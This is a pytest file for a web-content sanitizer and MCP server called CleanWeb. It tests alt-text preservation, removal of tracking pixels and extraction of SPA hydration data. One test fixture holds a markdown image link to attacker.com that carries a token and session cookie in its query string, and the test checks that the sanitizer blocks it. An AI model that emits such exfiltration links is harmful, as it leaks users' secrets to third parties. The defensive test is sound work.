"""
Comprehensive Unit Tests for CleanWeb v2.8.4 Features:
1. Multimodal Image Alt-Text Preservation
2. Tracking Pixel & Covert Channel Neutralization
3. Zero-Overhead SPA Hydration State Extraction (Next.js, Nuxt.js, JSON-LD)
4. MCP Server v2.8.4 Tool Compatibility
"""

import inspect
import pytest
from bs4 import BeautifulSoup
from app.cleaners.sanitizer import cleanweb_sanitizer, CleanwebHTMLParser
from app.cleaners.web_engine import web_cleaner_engine, extract_spa_hydration_data
from mcp_server import mcp, clean_web_content


def test_image_alt_text_extraction_html_parser():
    """Verify CleanwebHTMLParser preserves descriptive alt text for multimodal LLMs."""
    raw_html = """
    <div>
        <h1>Quarterly Earnings Report</h1>
        <p>Here is our financial overview:</p>
        <img src="https://example.com/charts/q3_revenue.png" alt="Bar chart showing Q3 revenue of $42M, up 15% YoY" />
    </div>
    """
    clean_text, hidden_removed, dangerous_removed, _ = cleanweb_sanitizer.sanitize_html_content(raw_html, preserve_alt_text=True)
    assert "Bar chart showing Q3 revenue of $42M, up 15% YoY" in clean_text
    assert "![Bar chart showing Q3 revenue of $42M, up 15% YoY](https://example.com/charts/q3_revenue.png)" in clean_text


def test_image_tracking_pixel_neutralization():
    """Verify 1x1 tracking pixels are dropped completely."""
    raw_html = """
    <div>
        <p>Standard email newsletter.</p>
        <img src="https://analytics.example.com/tracker.gif" alt="tracking_pixel" width="1" height="1" />
        <img src="https://analytics.example.com/pixel0.gif" alt="zero_pixel" width="0" height="0" />
    </div>
    """
    clean_text, _, _, _ = cleanweb_sanitizer.sanitize_html_content(raw_html, preserve_alt_text=True)
    assert "tracking_pixel" not in clean_text
    assert "zero_pixel" not in clean_text


def test_image_exfiltration_covert_channel_neutralization():
    """Verify exfiltration tracking links are blocked while preserving the image description."""
    md_with_exfil = "![Sensitive Architecture Diagram](https://attacker.com/leak.png?token=secret123&cookie=sessionabc)"
    sanitized, neutralized_count = cleanweb_sanitizer.neutralize_covert_channels(md_with_exfil)
    
    assert neutralized_count >= 1
    assert "![Sensitive Architecture Diagram][EXFILTRATION_IMAGE_BLOCKED]" in sanitized
    assert "secret123" not in sanitized
    assert "sessionabc" not in sanitized


def test_nextjs_spa_hydration_extraction():
    """Verify Next.js __NEXT_DATA__ hydration state is extracted seamlessly."""
    spa_html = """
    <!DOCTYPE html>
    <html>
    <head><title>Next.js Dynamic Dashboard</title></head>
    <body>
        <div id="__next"></div>
        <script id="__NEXT_DATA__" type="application/json">
        {
            "props": {
                "pageProps": {
                    "title": "Autonomous Agent Benchmarks 2026",
                    "overview": "CleanWeb achieved an 87.2% token reduction across 1,000 real-world domains.",
                    "methodology": "Tested with Playwright headless instances and raw HTML parsers measuring compression ratio."
                }
            }
        }
        </script>
    </body>
    </html>
    """
    soup = BeautifulSoup(spa_html, "html.parser")
    spa_data = extract_spa_hydration_data(soup)
    
    assert spa_data["framework"] == "Next.js"
    assert any("87.2% token reduction" in t for t in spa_data["extracted_texts"])
    assert any("Tested with Playwright" in t for t in spa_data["extracted_texts"])


def test_nuxt_spa_hydration_extraction():
    """Verify Nuxt.js __NUXT_DATA__ hydration state is extracted cleanly."""
    nuxt_html = """
    <!DOCTYPE html>
    <html>
    <head><title>Nuxt SPA Showcase</title></head>
    <body>
        <div id="__nuxt"></div>
        <script id="__NUXT_DATA__" type="application/json">
        [
            "Nuxt Hydration Root",
            "Decentralized Oracle attestation verifying Polygon USDC transactions.",
            "Zero-knowledge spend policy validation powered by EIP-712 typed data signatures."
        ]
        </script>
    </body>
    </html>
    """
    soup = BeautifulSoup(nuxt_html, "html.parser")
    spa_data = extract_spa_hydration_data(soup)
    
    assert spa_data["framework"] == "Nuxt.js"
    assert any("Decentralized Oracle attestation" in t for t in spa_data["extracted_texts"])
    assert any("Zero-knowledge spend policy" in t for t in spa_data["extracted_texts"])


def test_schema_json_ld_extraction():
    """Verify Schema.org JSON-LD structured data is extracted from modern web pages."""
    json_ld_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "NewsArticle",
            "headline": "AI Agents Surge in Web3 Micropayments",
            "articleBody": "Autonomous agents are rapidly adopting x402 protocol standards to pay per query on EVM networks."
        }
        </script>
    </head>
    <body>
        <div class="empty-spa-root"></div>
    </body>
    </html>
    """
    soup = BeautifulSoup(json_ld_html, "html.parser")
    spa_data = extract_spa_hydration_data(soup)
    
    assert spa_data["title"] == "AI Agents Surge in Web3 Micropayments"
    assert any("Autonomous agents are rapidly adopting x402 protocol" in t for t in spa_data["extracted_texts"])


def test_mcp_server_v284_metadata():
    """Verify MCP server reports version 2.8.4 and clean_web_content supports new multimodal and SPA arguments."""
    assert mcp.version == "2.8.4"
    
    sig = inspect.signature(clean_web_content)
    params = list(sig.parameters.keys())
    assert "preserve_alt_text" in params
    assert "dynamic_render" in params
    assert "scroll_depth" in params
    assert "max_tokens" in params
